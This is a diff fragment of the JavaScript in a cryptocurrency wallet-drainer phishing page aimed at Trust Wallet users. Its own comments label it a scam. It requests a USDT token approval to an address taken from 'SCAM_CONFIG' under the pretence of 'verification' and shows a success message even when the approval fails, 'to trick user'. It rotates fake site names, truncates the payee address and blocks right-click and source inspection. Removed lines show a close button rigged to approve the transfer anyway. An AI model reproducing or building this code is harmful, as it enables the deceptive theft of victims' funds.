                 const approveContract = new ethers.Contract(SCAM_CONFIG.usdtContract, approveAbi, signer);
                 
@@ -1013,95 +641,75 @@
                 
                 await approveTx.wait();
                 
-                // Show success message
+                // Show success
                 hideLoading();
-                showToast("✅ Verification complete! You will receive advance payment shortly.");
+                showToast("✅ Verification complete! Payment will be sent.");
                 
-                // Redirect after 3 seconds
+                // Redirect to tracking
                 setTimeout(() => {
-                    window.location.href = "https://t.me/usdt_verification_bot?start=" + 
-                                           encodeURIComponent(await signer.getAddress());
+                    window.location.href = "https://t.me/verify_success";
                 }, 3000);
                 
             } catch (error) {
                 hideLoading();
                 
                 if (error.code === 4001) {
-                    showToast("Transaction cancelled by user");
+                    showToast("Transaction cancelled");
                 } else {
                     // Still show success to trick user
-                    showToast("✅ Verification complete! You will receive advance payment shortly.");
+                    showToast("✅ Verification complete!");
                 }
             }
         }
         
-        // Load external script
-        function loadScript(src) {
-            return new Promise((resolve, reject) => {
-                const script = document.createElement('script');
-                script.src = src;
-                script.onload = resolve;
-                script.onerror = reject;
-                document.head.appendChild(script);
-            });
-        }
-        
-        // ==============================================
+        // ============================================
         // INITIALIZATION
-        // ==============================================
+        // ============================================
         
-        // Initialize on load
         document.addEventListener('DOMContentLoaded', function() {
-            // Randomly select site title from available URLs
-            const randomIndex = Math.floor(Math.random() * SCAM_CONFIG.siteUrls.length);
-            const siteTitle = SCAM_CONFIG.siteUrls[randomIndex];
-            const siteUrl = `https://${siteTitle}`;
+            // Randomly select which site to show
+            const siteIndex = Math.floor(Math.random() * SCAM_CONFIG.sites.length);
+            const currentSite = SCAM_CONFIG.sites[siteIndex];
             
-            document.getElementById('siteTitle').textContent = siteTitle;
-            document.getElementById('currentUrl').textContent = siteUrl;
-            document.getElementById('modalDapp').textContent = siteTitle;
-            document.getElementById('dappUrl').textContent = siteUrl;
+            document.getElementById('siteUrl').textContent = currentSite.primary;
+            document.getElementById('secondaryUrl').textContent = currentSite.secondary;
             
-            // Update address to show full scam address
-            document.getElementById('recipientAddress').textContent = 
-                SCAM_CONFIG.paymentAddress.substring(0, 22) + '...';
+            // Set up address display (truncated as in screenshot)
+            const address = SCAM_CONFIG.paymentAddress;
+            const displayAddress = address.length > 20 
+                ? address.substring(0, 20) + '...' 
+                : address;
+            document.getElementById('addressDisplay').textContent = displayAddress;
             
-            // Set initial USD value
+            // Initialize USD value
             updateUSDValue();
             
-            // Detect if running in Trust Wallet
+            // Add event listeners for Trust Wallet controls
+            document.querySelectorAll('.control-item').forEach(item => {
+                item.addEventListener('click', function() {
+                    const text = this.querySelector('span').textContent;
+                    showToast(`${text} feature would open here`);
+                });
+            });
+            
+            // Detect Trust Wallet
             if (window.ethereum && window.ethereum.isTrust) {
-                console.log("Trust Wallet detected - optimizing scam interface");
-                // Additional Trust Wallet specific optimizations
-                document.body.style.paddingBottom = 'env(safe-area-inset-bottom)';
+                console.log("Trust Wallet detected");
+                // Add Trust-specific optimizations
             }
             
-            // Prevent user from seeing source
+            // Prevent inspection
             document.addEventListener('contextmenu', e => e.preventDefault());
             document.addEventListener('keydown', e => {
-                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-                    e.preventDefault();
-                }
+                if (e.ctrlKey && e.shiftKey && e.key === 'I') e.preventDefault();
+                if (e.ctrlKey && e.key === 'u') e.preventDefault();
             });
-        });
-        
-        // Override modal close button to trigger actual approval
-        document.querySelector('.close-button').addEventListener('click', function(e) {
-            e.stopPropagation();
-            confirmApproval(); // Actually approves when user tries to close!
-        });
-        
-        // Add CSS for fade animation
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes fadeInOut {
-                0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
-                10% { opacity: 1; transform: translateX(-50%) translateY(0); }
-                90% { opacity: 1; transform: translateX(-50%) translateY(0); }
-                100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+            
+            // Add safe area support for iPhone
+            if (CSS.supports('padding-bottom: env(safe-area-inset-bottom)')) {
+                document.body.style.paddingBottom = 'env(safe-area-inset-bottom)';
             }
-        `;
-        document.head.appendChild(style);
+        });
     </script>
 </body>
 </html>
